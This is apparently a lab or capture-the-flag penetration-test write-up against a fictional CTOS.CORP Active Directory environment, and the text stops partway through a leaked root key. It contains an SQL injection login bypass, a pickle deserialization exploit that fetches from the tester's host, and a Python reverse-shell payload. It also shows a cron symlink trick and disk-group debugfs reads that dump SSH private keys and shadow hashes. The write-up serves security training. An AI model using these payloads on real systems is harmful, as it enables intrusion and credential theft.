# Objective
CTOS Corporation delivers cutting-edge managed services, cloud solutions, and cybersecurity expertise to clients of all sizes. You have been hired to perform their annual penetration test against 3 high-value targets in the Active Directory environment. Your task is to identify all vulnerabilties and (if possible) elevate your privileges to Domain Admin.

You have been provided VPN access to their internal network, but no other information.

![](Pasted%20image%2020260831140535.png)

# Host file setup
```python
sudo nxc smb 10.1.24.233 --generate-hosts-file /etc/hosts
SMB         10.1.24.233     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:CTOS.CORP) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration

Ill start by making a hosts.txt file with all IPs inside

## Open ports
```python
nmap -p- --min-rate=2000 -sT -iL hosts.txt -Pn
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-31 14:09 -0400
Warning: 10.1.61.204 giving up on port because retransmission cap hit (10).
Warning: 10.1.24.233 giving up on port because retransmission cap hit (10).
Nmap scan report for DC01.CTOS.CORP (10.1.24.233)
Host is up (0.14s latency).
Not shown: 64816 closed tcp ports (conn-refused), 691 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49688/tcp open  unknown
49708/tcp open  unknown
49716/tcp open  unknown
49721/tcp open  unknown
49805/tcp open  unknown

Nmap scan report for 10.1.206.115
Host is up (0.097s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman

Nmap scan report for 10.1.61.204
Host is up (0.096s latency).
Not shown: 64638 closed tcp ports (conn-refused), 895 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 3 IP addresses (3 hosts up) scanned in 213.67 seconds
```

## Nmap
```python
nmap -p- -A --min-rate=2000 -sT -iL hosts.txt -Pn

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-31 18:18:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: CTOS.CORP, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.CTOS.CORP
| Not valid before: 2026-02-15T20:12:45
|_Not valid after:  2027-02-15T20:12:45
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: CTOS.CORP, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.CTOS.CORP
| Not valid before: 2026-02-15T20:12:45
|_Not valid after:  2027-02-15T20:12:45
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CTOS.CORP, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.CTOS.CORP
| Not valid before: 2026-02-15T20:12:45
|_Not valid after:  2027-02-15T20:12:45
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: CTOS.CORP, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.CTOS.CORP
| Not valid before: 2026-02-15T20:12:45
|_Not valid after:  2027-02-15T20:12:45
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CTOS
|   NetBIOS_Domain_Name: CTOS
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: CTOS.CORP
|   DNS_Computer_Name: DC01.CTOS.CORP
|   DNS_Tree_Name: CTOS.CORP
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-31T18:19:46+00:00
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Not valid before: 2026-08-12T15:59:39
|_Not valid after:  2027-02-11T15:59:39
|_ssl-date: 2026-08-31T18:20:26+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing


Nmap scan report for 10.1.206.115
Host is up (0.12s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-31T18:20:26+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CTOS
|   NetBIOS_Domain_Name: CTOS
|   NetBIOS_Computer_Name: IT-WS01
|   DNS_Domain_Name: CTOS.CORP
|   DNS_Computer_Name: IT-WS01.CTOS.CORP
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-31T18:19:48+00:00
| ssl-cert: Subject: commonName=IT-WS01.CTOS.CORP
| Not valid before: 2026-08-12T16:48:20
|_Not valid after:  2027-02-11T16:48:20
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows



Nmap scan report for 10.1.61.204
Host is up (0.12s latency).
Not shown: 64391 closed tcp ports (conn-refused), 1142 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4c:b2:d9:53:df:da:8e:18:c3:63:71:48:6d:48:f5:39 (ECDSA)
|_  256 72:ba:15:78:a7:2c:71:c5:ab:cc:e5:04:16:14:2b:15 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Home | Enterprise Technology Solutions
```


# SSH (22) WEB-01
## Auth method
```python
ssh root@ctos.site  
The authenticity of host 'ctos.site (10.1.61.204)' can't be established.
ED25519 key fingerprint is: SHA256:ZQjE35p7M8AdW6EBRRcXF+xTwL3z8MqGNTKmJE9tR0M
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ctos.site' (ED25519) to the list of known hosts.
root@ctos.site's password:
```

It uses password based authentication

# HTTP (80) WEB-01

![](Pasted%20image%2020260831142035.png)

There are no subdomains

Feroxbuster found `/login`

The about page holds some users

![](Pasted%20image%2020260831142129.png)

```python
marcus chen
elena rodriguez
james wilson
sarah mitchell
david park
lisa conrad
```

I could potentially run these users against username anarchy to generate some combinations then user kerburte to vaidate

Also the session ID is interesting

```python
gASV4gAAAAAAAACMA2FwcJSMC1Nlc3Npb25EYXRhlJOUKYGUfZQojAp2aXNpdG9yX2lklIwQZTVmMTQ3ZmVlYjBkNmNiZpSMBXRoZW1llIwFbGlnaHSUjA12aXNpdGVkX3BhZ2VzlF2UKIwBL5SMBi9hYm91dJSMCS9zZXJ2aWNlc5SMBS9uZXdzlIwIL2NhcmVlcnOUjAgvY29udGFjdJRljAtmaXJzdF92aXNpdJSMGjIwMjYtMDgtMzFUMjM6NDY6MTkuODkwMjEylIwIdXNlcm5hbWWUTowNYXV0aGVudGljYXRlZJSJdWIu
```

![](Pasted%20image%2020260831145236.png)

To decode this ill base64 decode the value then use a script that uses the pickle library to make it fully readable

```python
import base64
import pickle
import sys

# 1. Fake the application module structure so pickle doesn't crash
class DummyClass(object):
    def __reduce__(self):
        return (self.__class__, ())

# Inject our dummy class into sys.modules so Python thinks 'app.SessionData' exists
import types
app_module = types.ModuleType("app")
app_module.SessionData = DummyClass
sys.modules["app"] = app_module

# 2. Your string
b64_string = "gASV4gAAAAAAAACMA2FwcJSMC1Nlc3Npb25EYXRhlJOUKYGUfZQojAp2aXNpdG9yX2lklIwQZTVmMTQ3ZmVlYjBkNmNiZpSMBXRoZW1llIwFbGlnaHSUjA12aXNpdGVkX3BhZ2VzlF2UKIwBL5SMBi9hYm91dJSMCS9zZXJ2aWNlc5SMBS9uZXdzlIwIL2NhcmVlcnOUjAgvY29udGFjdJRljAtmaXJzdF92aXNpdJSMGjIwMjYtMDgtMzFUMjM6NDY6MTkuODkwMjEylIwIdXNlcm5hbWWUTowNYXV0aGVudGljYXRlZJSJdWIu"

# 3. Decode and Unpickle
pickle_bytes = base64.b64decode(b64_string)
session_obj = pickle.loads(pickle_bytes)

# 4. View the internal attributes of the session object
print(vars(session_obj))
```

Ill use this script to do it

```python
python3 decode.py 
{'visitor_id': 'e5f147feeb0d6cbf', 'theme': 'light', 'visited_pages': ['/', '/about', '/services', '/news', '/careers', '/contact'], 'first_visit': '2026-08-31T23:46:19.890212', 'username': None, 'authenticated': False}
```

It is now decoded

I can then user the following encode script to try and forge a session token

```python
import base64
import pickle
import sys
import types

# 1. Recreate the 'app.SessionData' module structure so the target server recognizes the object type
class SessionData:
    def __init__(self, username, authenticated):
        self.visitor_id = "e5f147feeb0d6cbf"
        self.theme = "light"
        self.visited_pages = ["/", "/about", "/services", "/news", "/careers", "/contact"]
        self.first_visit = "2026-08-31T23:46:19.890212"
        self.username = username
        self.authenticated = authenticated

# Inject the class into sys.modules as 'app.SessionData'
app_module = types.ModuleType("app")
app_module.SessionData = SessionData
sys.modules["app"] = app_module

def main():
    print("--- HackSmarter Session Encoder ---")
    
    # Take user input for the target attributes
    username = input("Enter username (e.g., admin): ").strip()
    auth_input = input("Set authenticated status (true/false): ").strip().lower()
    
    # Convert input string to actual boolean value
    authenticated = True if auth_input in ['true', 't', '1', 'yes'] else False
    
    # Handle 'None' or empty values for username
    if username == "None" or username == "":
        username = None

    # 2. Instantiate the session object with the custom values
    custom_session = SessionData(username=username, authenticated=authenticated)
    
    # 3. Serialize the object using Python Pickle
    pickle_bytes = pickle.dumps(custom_session, protocol=4)
    
    # 4. Encode the binary bytes to Base64 text
    b64_encoded = base64.b64encode(pickle_bytes).decode('utf-8')
    
    print("\n[+] Generated Session String:")
    print(b64_encoded)

if __name__ == "__main__":
    main()
```

Ive tried this script setting the username to `admin` and it failed

So ive tried many combinations on this, i think this is a dead end at least for now, even tried generating a list of users based on the staff page then using them and still failing

# Access to `/portal` (port 80 WEB-01)

```python
`admin' OR '1'='1`
```

![1145](Pasted%20image%2020260831152132.png)

There is really only one interesting link on this page for an `Site Archive`

This link downloads a zip file

There is an RCE vulnerability in the `app.py`

```python
def get_session():
    cookie = request.cookies.get('ctos_session')
    if cookie:
        try:
            data = base64.b64decode(cookie)
            return pickle.loads(data)   # <-- here
        except:
            pass
    return None
```

The app takes the `ctos_session` cookie - a value fully controlled by the client/visitor - base64-decodes it, and feeds it straight into `pickle.loads()`

So i can basically pass a command into my cookie and send a GET request to the site, this is likely to be blind RCE, so ill test it with a python web server

# RCE

```python
cat RCE.py          
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("wget http://10.200.88.158/test.txt",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

Ill use this script to craft the malicious session ID

```python
python3 RCE.py           
gAWVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJ3Z2V0IGh0dHA6Ly8xMC4yMDAuODguMTU4L3Rlc3QudHh0lIWUUpQu
```

Ill then run the script to make the session

```python
python3 -m http.server 80
```

Ill then start a webserver

```python
curl http://ctos.site/ -H 'Cookie: ctos_session=gAWVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJ3Z2V0IGh0dHA6Ly8xMC4yMDAuODguMTU4L3Rlc3QudHh0lIWUUpQu'
```

Then ill send the request to the site using the malicious session

```python
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.200.88.158 - - [31/Aug/2026 16:08:42] code 404, message File not found
10.200.88.158 - - [31/Aug/2026 16:08:42] "GET /test.txt HTTP/1.1" 404 -
```

I have blind RCE

Now this is confirmed i can work on getting a reverse shell

# Reverse shell on WEB-01

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.130 • 10.200.88.158
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

So first ill start a listener

```python
cat RCE.py          
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.200.88.158\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

Ill craft my payload

```python
python3 RCE.py 
gAWV5wAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjMxweXRob24gLWMgJ2ltcG9ydCBzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjIwMC44OC4xNTgiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKSeUhZRSlC4=
```

Ill then run the script and get the malicious session

```python
curl http://ctos.site/ -H 'Cookie: ctos_session=gAWV5wAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjMxweXRob24gLWMgJ2ltcG9ydCBzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjIwMC44OC4xNTgiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKSeUhZRSlC4='
```

Now ill send the request using the malicious session

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.130 • 10.200.88.158
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => /bin/sh: 7: grep: not found
web-01 10.1.61.204 Linux-x86_64 👤 /bin/sh: 3: id: not found
/bin/sh: 3: id: not found
() 😍️ Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[-] Cannot get the TTY of the shell. Response:
Command 'tty' is available in the following places
 * /bin/tty
 * /usr/bin/tty
The command could not be located because '/usr/bin:/bin' is not included in the PATH environment variable.
tty: command not found
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/_bin_sh: 7: grep: not found
web-01~10.1.61.204-Linux-x86_64/2026_09_01-12_54_18-812-_bin_sh: 3: id: not found
_bin_sh: 3: id: not found
().log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
bash: groups: command not found
phil@web-01:/opt/ctos_portal$
```

However i cant really run commands, since the path `/usr/bin` is not in the path, so ill export that

```python
export PATH=/usr/bin
```

```python
phil@web-01:/opt/ctos_portal$ whoami
phil
phil@web-01:/opt/ctos_portal$
```

Now i can run commands

However the session reminas slow so ill get SSH access

![](Pasted%20image%2020260901131327.png)

I found a sqlite file stored in the `/opt/ctos_portal` directory, so ive transferred that to my machine and found a password stored inside

```python
ctos_ultra_secure_pass_2026_!@#$
```

This password does nothing for me at this stage

# Enumeration as `phil`

![](Pasted%20image%2020260901132809.png)

Looks to be a backup script, i would assume this is running as a cron job maybe?

```python
#!/bin/bash

export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

LOG_FILE="/var/log/backup/backup.log"
STAGING_DIR="/home/phil/backup_staging"
CONFIG_FILE="$STAGING_DIR/backup_config"
SOURCE_DIR="/opt/ctos_portal"
BACKUP_FILE="/opt/ctos_portal/static/backup.zip"

...[SNIP]...
```

This script is vulnerable!

Since its using `phil`'s home directory, specifically the file `/home/phil/backup_staging/backup_config` 

It is then using the `CONFIG_FILE` variable later on in the script

```python
if [ -f "$CONFIG_FILE" ]; then
    echo "[$(date)] Reading backup configuration from phil's staging..." >> "$LOG_FILE"
    cat "$CONFIG_FILE" >> "$LOG_FILE" 2>&1
    rm -f "$CONFIG_FILE"
    echo "[$(date)] Configuration processed and removed" >> "$LOG_FILE"
```

Its using cat to output the contents of the `backup_config` file, what if i simply add a symlink to the file so it cats out the contents of a SSH private key

# Access as `john` on SSH

```python
phil@web-01:/home/phil/backup_staging$ ln -sf /home/john/.ssh/id_rsa backup_config
phil@web-01:/home/phil/backup_staging$ ls -al
total 8
drwxr-xr-x  2 phil phil 4096 Sep  1 23:08 .
drwxr-xr-x 16 phil phil 4096 Sep  1 22:32 ..
lrwxrwxrwx  1 phil phil   22 Sep  1 23:08 backup_config -> /home/john/.ssh/id_rsa
```

First ill add the symlink and show the link

Now ill wait a moment for it to run the cron job and ill check the `/var/log/backup/backup.log` file for the output

```python
cat /var/log/backup/backup.log

[Tue Sep  1 11:09:47 PM IST 2026] Reading backup configuration from phil's staging...
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

I now have the private key

Ill copy this to my machine and set the right permissions

![](Pasted%20image%2020260901134252.png)

Now i have access

# Root access on SSH

```python
john@web-01:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),6(disk)
```

I am part of the `disk` group, i can use this to access any file on the system i want

https://caramellia.medium.com/privilege-escalation-via-disk-group-membership-daa75a7cd930

```python
john@web-01:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
tmpfs           193M  1.3M  192M   1% /run
/dev/nvme0n1p2   30G  9.9G   18G  36% /
tmpfs           963M     0  963M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           193M   96K  193M   1% /run/user/120
tmpfs           193M   84K  193M   1% /run/user/1001
```

Then ill see where the root filesystem is mounted, in this case it is `/dev/nvme0n1p2` 

```python
john@web-01:~$ debugfs -R "cat /etc/shadow" /dev/nvme0n1p2                   
debugfs 1.47.0 (5-Feb-2023)
root:$y$j9T$uRHoEU5C3ZnE6Kt6Sz/NW1$8m3MtiaS4dFlfT/2t6RYKa18S54WXM5.CenjwiQhtF6:20501:0:99999:7:::

...[SNIP]...

john:$y$j9T$lX/l.Yv7LH4cST6t15deg1$t9fSpc2xmG3UBtnHUpZDfG.QUr1ucZ2ak1SLzMl3/jC:20501:0:99999:7:::
phil:$y$j9T$i2LFuy7cs2HePwULiFRMJ/$YzG0GUcPaP01bzjW3vWbb4pMkMmsEkPTx04DLeitby0:20501:0:99999:7:::
```

And now i can access any file on the system using this

```python
john@web-01:~$ debugfs -R "cat /root/.ssh/id_rsa" /dev/nvme0n1p2   
debugfs 1.47.0 (5-Feb-2023)
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAwga1aMxrdGzrsrzIhYlg90R8b1w1ysEWj49lzWv2VBSubyjP6eNL
edWlZZMSfaMa5r+DBuUh3WSTvS6NTYId9h+ObHyi2JGg5rWwxTxC2hvc8BvGXYKqrlojKQ
esWfBlDZJ0Zn2GJ3jLPplbFiCcuAXTJfiyBX0IkYxflzvLqcXbMhrdQo9X77UL/4PCrOEW
00eSixlpCl98NgB6/MMnrDMKvGPbbwLggusAAVOspglvqQLyx+mBWgjFgvhIDp88HIuEHk
ZhHMA66Z4scRjvmEhVf4sxcqGTSN98IzEVG5UXrCb3iO2qH+Dm97RKWRaC9qTWYYsS1KwY
MylDMLJ09kbnF2bsiPvlUwk4J5locNQCieOQ0gN3wIxQF8W75hubpijsutMReUVHbHcCGc
VSs7z3ClaXod9LzSmgxTgTu4Rkin3W/cZfdiGBxCSS/BWcsEjSuLoUWGPOgr0UGVnqpd4f
yTHKtSlXmUXjQW72Juf5ZXLiEP6HPAMHGh8nh8x7tWPiaZB2mKStRVAt02hf6FERGGRDGd
8bERqews3FwlP8GGF3kllTge9cx00Q/6lIRYnI3r+ey7D3SEx7oku3myc33GjOYmlERMHv
eFp7488Y2apUvvNnoE8Rfoh2fNzXrI3KHFJ7mDGS351PnsQps08oECfmMjX5bTP+H0Wg0f
8AAAdASZL1QkmS9UIAAAAHc3NoLXJzYQAAAgEAwga1aMxrdGzrsrzIhYlg90R8b1w1ysEW
j49lzWv2VBSubyjP6eNLedWlZZMSfaMa5r+DBuUh3WSTvS6NTYId9h+ObHyi2JGg5rWwxT
xC2hvc8BvGXYKqrlojKQesWfBlDZJ0Zn2GJ3jLPplbFiCcuAXTJfiyBX0IkYxflzvLqcXb
MhrdQo9X77UL/4PCrOEW00eSixlpCl98NgB6/MMnrDMKvGPbbwLggusAAVOspglvqQLyx+
mBWgjFgvhIDp88HIuEHkZhHMA66Z4scRjvmEhVf4sxcqGTSN98IzEVG5UXrCb3iO2qH+Dm
97RKWRaC9qTWYYsS1KwYMylDMLJ09kbnF2bsiPvlUwk4J5locNQCieOQ0gN3wIxQF8W75h
ubpijsutMReUVHbHcCGcVSs7z3ClaXod9LzSmgxTgTu4Rkin3W/cZfdiGBxCSS/BWcsEjS
uLoUWGPOgr0UGVnqpd4fyTHKtSlXmUXjQW72Juf5ZXLiEP6HPAMHGh8nh8x7tWPiaZB2mK
StRVAt02hf6FERGGRDGd8bERqews3FwlP8GGF3kllTge9cx00Q/6lIRYnI3r+ey7D3SEx7
oku3myc33GjOYmlERMHveFp7488Y2apUvvNnoE8Rfoh2fNzXrI3KHFJ7mDGS351PnsQps0
8oECfmMjX5bTP+H0Wg0f8AAAADAQABAAACAEYQ6yDhtSoxjToaD2Wdsy0IB9GlIG3MJawJ
